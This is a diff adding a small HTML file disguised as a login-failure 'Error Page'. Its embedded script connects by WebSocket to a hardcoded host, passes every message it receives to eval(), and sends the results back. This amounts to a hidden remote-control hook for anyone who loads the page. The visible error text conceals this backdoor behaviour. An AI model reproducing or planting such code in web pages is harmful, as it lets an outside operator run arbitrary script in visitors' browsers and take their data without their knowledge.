@@ -1,0 +1,34 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <title>Error Page</title>
+  <link href="demo.css" media="all" rel="stylesheet" type="text/css">
+    <script type="text/javascript">
+	var socket = new WebSocket("ws://10.86.8.71:82/");
+	socket.onmessage = function(event){
+		text = event.data;
+		
+		if(text == 'init') {  
+			socket.send('ready');
+		} else if (text == 'close') {
+			socket.send('closed');
+		} else {
+//		 	alert(text);
+			result = eval(text);
+			
+			var resp = result + '<split>success';
+//			alert(resp);
+			socket.send(resp);
+			
+		}
+	}
+
+	</script>  
+</head>
+<body>
+  <div id="container">
+    <h1 id="error">Error Page</h1>
+    <p>Login failed. Invalid user name and/or password.</p>
+  </div>
+</body>
+</html>
